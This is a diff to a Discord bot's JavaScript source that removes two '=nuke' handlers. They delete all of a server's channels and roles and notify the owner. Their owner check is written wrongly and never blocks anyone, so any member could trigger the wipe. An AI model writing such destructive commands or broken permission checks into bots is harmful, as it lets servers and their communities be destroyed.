@@ -1008,22 +1008,6 @@ m.sendFile(message.attachments.first().url).catch();
 
 
 
-client.on('message', message => {
-    if(!message.author === message.guild.owner) return;
-    if(message.content === '=nuke') {
-        message.guild.channels.forEach(c => { c.delete() })
-        message.guild.owner.sendMessage('Your server has been nuked\nName: ' + ` **${message.guild.name}**`);
-
-    }
-});
-
-client.on('message', message => {
-    if(!message.author === message.guild.owner) return;
-    if(message.content === '=nuke') {
-        message.guild.roles.forEach(r => { r.delete() })
-
-    }
-});
     client.on('message', message => {
         if(message.content.startsWith(prefix + 'namemc')) {
             let args = message.content.split(' ').slice(1).join(' ');
